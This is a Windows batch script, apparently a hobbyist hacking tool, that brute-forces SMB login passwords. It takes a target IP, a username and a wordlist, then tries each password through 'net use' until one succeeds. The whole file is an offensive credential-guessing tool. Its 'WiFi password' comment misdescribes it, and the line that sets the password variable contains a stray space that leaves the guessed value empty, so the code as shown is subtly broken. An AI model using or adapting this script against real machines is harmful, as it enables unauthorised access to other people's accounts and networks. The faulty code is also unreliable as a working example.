::Find the WiFi Password :)
@echo off
title SMB Bruteforce - by MeNeS
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

::Go through whole list, and check for each
set /a count=0
for /f %%a in (%wordlist%) do (
    set pass =%%a
    call :attempt
) 

::Pass not found
echo Password not Found ;(
pause
exit


:success
echo.
echo Password Found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

::Checking for password x
::errorlevel chceks for no errors when trying password. Normal command ecery device has. If 0, means that no error was found and the correct password is x
::nul for hiding output message
:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] %pass%
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
